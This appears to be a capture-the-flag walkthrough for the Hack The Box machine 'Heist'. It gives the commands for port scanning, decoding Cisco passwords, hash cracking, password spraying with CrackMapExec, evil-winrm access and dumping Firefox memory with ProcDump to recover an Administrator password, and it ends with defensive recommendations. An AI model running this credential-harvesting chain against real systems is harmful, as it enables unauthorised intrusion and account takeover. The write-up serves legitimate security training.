# HTB - Heist

**IP Address:** `10.10.10.149`  
**OS:** Windows  
**Difficulty:** Easy  
**Tags:** #SMB, #WinRM, #Cisco, #PasswordCracking, #FirefoxDump  

---
## Synopsis

Heist is an easy Windows machine that demonstrates credential harvesting from Cisco configuration files, brute-force attempts with CrackMapExec, enumeration of domain users via Impacket’s `lookupsid.py`, and process dumping with Sysinternals ProcDump to extract sensitive information from memory. The attack path culminates in obtaining valid administrator credentials from a Firefox memory dump.

---
## Skills Required

- Basic Windows enumeration  
- Familiarity with SMB/WinRM authentication  
- Understanding of Cisco password types  
- Knowledge of process dumping techniques  

## Skills Learned

- Decoding Cisco type 7 passwords  
- Using Impacket’s `lookupsid.py` to enumerate domain users  
- Extracting passwords from memory dumps  
- Lateral movement using valid credentials  

---
## 1. Initial Enumeration

### 1.1 Connectivity Test

```bash
ping -c 1 10.10.10.149
```
![](GitHubv2/HackTheBox/EASY/Heist/screenshots/ping.png)

The host responds, confirming it is reachable.

---
### 1.2 Port Scanning

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.149 -oG allPorts
```

- `-p-`: Scan all 65,535 ports  
- `--open`: Show only open ports  
- `-sS`: SYN scan  
- `--min-rate 5000`: Increase speed  
- `-Pn`: Skip host discovery (already confirmed alive)  
- `-oG`: Output in grepable format

![](GitHubv2/HackTheBox/EASY/Heist/screenshots/allports.png)

Extract open ports:

```bash
extractPorts allPorts
```

![](GitHubv2/HackTheBox/EASY/Heist/screenshots/extractports.png)

---
### 1.3 Targeted Scan

```bash
nmap -p80,135,445,5985,49669 -sC -sV 10.10.10.149 -oN targeted
```

- `-sC`: Run default NSE scripts  
- `-sV`: Detect service versions  
- `-oN`: Output in human-readable format  

Let's check the result:

```bash
cat targeted -l java
```

![](GitHubv2/HackTheBox/EASY/Heist/screenshots/targeted.png)

**Findings:**

| Port  | Service  | Description                                |
|-------|----------|--------------------------------------------|
| 80    | HTTP     | Microsoft IIS 10.0                         |
| 135   | MS RPC   | Microsoft RPC endpoint mapper              |
| 445   | SMB      | Windows SMB file sharing                   |
| 5985  | WinRM    | Windows Remote Management (HTTP)           |
| 49669 | MS RPC   | Microsoft RPC dynamic port                 |

The target is running **IIS 10.0**, with **SMB** and **WinRM** exposed.

---
## 2. Web Enumeration

### 2.1 WhatWeb Analysis

```bash
whatweb http://10.10.10.149
```

![](GitHubv2/HackTheBox/EASY/Heist/screenshots/whatweb.png)

The site redirects to a `login.php` page.

![](GitHubv2/HackTheBox/EASY/Heist/screenshots/web_login.png)

### 2.2 Guest Access

The application allows guest login:

![](GitHubv2/HackTheBox/EASY/Heist/screenshots/web_guest.png)

We see potential usernames:

- **Hazard**  
- **Support Admin**

A Cisco router configuration is attached:

![](GitHubv2/HackTheBox/EASY/Heist/screenshots/web_attachment.png)

---
## 3. Credential Harvesting

### 3.1 Cisco Type 7 Passwords

The config file shows Cisco type 7 passwords:

- `rout3r // 7 0242114B0E143F015F5D1E161713`  
- `admin  // 7 02375012182C1A1D751618034F36415408`  

Using an [online decoder](https://www.ifm.net.nz/cookbooks/passwordcracker.html) for cisco passwords:  

![](GitHubv2/HackTheBox/EASY/Heist/screenshots/cisco_password_crack_rout3r.png)
![](GitHubv2/HackTheBox/EASY/Heist/screenshots/cisco_password_crack_admin.png)

Decrypted:

- **rout3r** → `$uperP@ssword`  
- **admin** → `Q4)sJu\Y8qz*A3?d`  

![](GitHubv2/HackTheBox/EASY/Heist/screenshots/credentials.png)

We store them for later testing.

### 3.2 Extracted Hash

The file also contains an MD5 hash:

```bash
$1$pdQG$o8nrSzsGXeaduXrjlvKc91
```

Cracked with John:

```bash
john -w:$(locate rockyou.txt | tail -n 1) hash.txt
```

![](GitHubv2/HackTheBox/EASY/Heist/screenshots/john_hash.png)

Recovered password: **stealth1agent**

![](GitHubv2/HackTheBox/EASY/Heist/screenshots/passwords.png)

---
## 4. SMB & User Enumeration

### 4.1 CrackMapExec Attempts

We combine users and passwords:

```bash
crackmapexec smb 10.10.10.149 -u users.txt -p passwds.txt --continue-on-success
```

![](GitHubv2/HackTheBox/EASY/Heist/screenshots/crackmapexec_smb_hazard.png)

User **Hazard** is valid with password `stealth1agent`.


``` bash
crackmapexec winrm 10.10.10.149 -u 'hazard' -p 'stealth1agent'
```

![](GitHubv2/HackTheBox/EASY/Heist/screenshots/crackmapexec_winrm_hazard.png)

The account does not belong to the **Remote Management Users** group, so we cannot use WinRM at this stage.  
Next, we attempt to enumerate resources with `rpcclient` and `smbmap`:

``` bash
rpcclient -U "hazard%stealth1agent" 10.10.10.149 -c 'enumdomusers'
smbmap -H 10.10.11.174 -u 'hazard%stealth1agent'
```

![](GitHubv2/HackTheBox/EASY/Heist/screenshots/smbmap_rpcclient_NOK.png)

No useful information is retrieved.  

### 4.2 Domain Enumeration

To continue, we use **Impacket’s `lookupsid.py`**, which allows enumeration of domain accounts when valid credentials are available. With the following details:

- **Username**
- **Password**
- **Domain**
- **Target IP**

We can list all users on the system:

```bash
lookupsid.py SUPPORTDESK/hazard:stealth1agent@10.10.10.149
```

![](GitHubv2/HackTheBox/EASY/Heist/screenshots/lookupsid.png)

We discover additional users and update our wordlist:  

![](GitHubv2/HackTheBox/EASY/Heist/screenshots/users_updated.png)

### 4.3 Credential Spraying

```bash
crackmapexec smb 10.10.10.149 -u users.txt -p passwds.txt --continue-on-success
```

![](GitHubv2/HackTheBox/EASY/Heist/screenshots/crackmapexec_smb_chase.png)

New valid user: **Chase**

Check WinRM access:

```bash
crackmapexec winrm 10.10.10.149 -u 'Chase' -p 'Q4)sJu\Y8qz*A3?d'
```

![](GitHubv2/HackTheBox/EASY/Heist/screenshots/crackmapexec_winrm_chase.png)

Access confirmed.

---
## 5. Foothold

### 5.1 Evil-WinRM Access

```bash
evil-winrm -i 10.10.10.149 -u 'Chase' -p 'Q4)sJu\Y8qz*A3?d'
```

![](GitHubv2/HackTheBox/EASY/Heist/screenshots/user_flag.png)

🏁 **User flag obtained**

### 5.2 Privilege Enumeration

```bash
whoami /all
```

![](GitHubv2/HackTheBox/EASY/Heist/screenshots/chase_whoami_all.png)

No exploitable privileges found.

---
## 6. Privilege Escalation

### 6.1 Process Enumeration

```bash
ps
```

![](GitHubv2/HackTheBox/EASY/Heist/screenshots/chase_ps.png)

Suspiciously high number of Firefox processes.

```bash
ps | findstr firefox
```

![](GitHubv2/HackTheBox/EASY/Heist/screenshots/chase_ps_firefox.png)

### 6.2 Dumping Firefox Process

Upload Sysinternals ProcDump:

```bash
upload /home/kali/Documents/Machines/Heist/content/procdump64.exe
```

![](GitHubv2/HackTheBox/EASY/Heist/screenshots/chase_upload_procdump64.png)

Dump Firefox process:

```bash
.\procdump64.exe -accepteula -ma 6356
```

![](GitHubv2/HackTheBox/EASY/Heist/screenshots/chase_execute_procdump64.png)

Download the dump:

```bash
C:\Users\Chase\Desktop> download firefox.exe_250823_183228.dmp firefox.dmp
```

### 6.3 Extracting Credentials

Search `password` on dump file:

```bash
strings firefox.dmp | grep password
```

![](GitHubv2/HackTheBox/EASY/Heist/screenshots/dump_password.png)

Recovered credentials:

- **Administrator** → `4dD!5}x/re8]FBuZ`

---
## 7. Administrator Access

Validate credentials:

```bash
crackmapexec smb 10.10.10.149 -u 'Administrator' -p '4dD!5}x/re8]FBuZ'
```

![](GitHubv2/HackTheBox/EASY/Heist/screenshots/crackmapexec_smb_admin.png)

Obtain shell:

```bash
evil-winrm -i 10.10.10.149 -u 'Administrator' -p '4dD!5}x/re8]FBuZ'
```

![](GitHubv2/HackTheBox/EASY/Heist/screenshots/root_flag.png)

🏁 **Root flag obtained**

---
# ✅ MACHINE COMPLETE

---
## Summary of Exploitation Path

1. **Web Enumeration** → Found Cisco configuration file with encoded credentials.  
2. **Cisco Type 7 Password Cracking** → Retrieved plaintext credentials.  
3. **Password Cracking (John)** → Recovered `stealth1agent`.  
4. **SMB & User Enumeration** → Valid users `Hazard` and `Chase`.  
5. **Evil-WinRM Foothold** → Logged in as `Chase`.  
6. **ProcDump Analysis** → Extracted Firefox process memory.  
7. **Credential Extraction** → Found Administrator password.  
8. **Privilege Escalation** → Logged in as Administrator.  

---
## Defensive Recommendations

- Avoid storing Cisco type 7 passwords, as they are trivially reversible.  
- Enforce strong and unique passwords across systems.  
- Limit access to sensitive configuration files.  
- Monitor processes for abnormal behavior (e.g., excessive Firefox instances).  
- Regularly audit credentials stored in memory and implement credential guard solutions.  
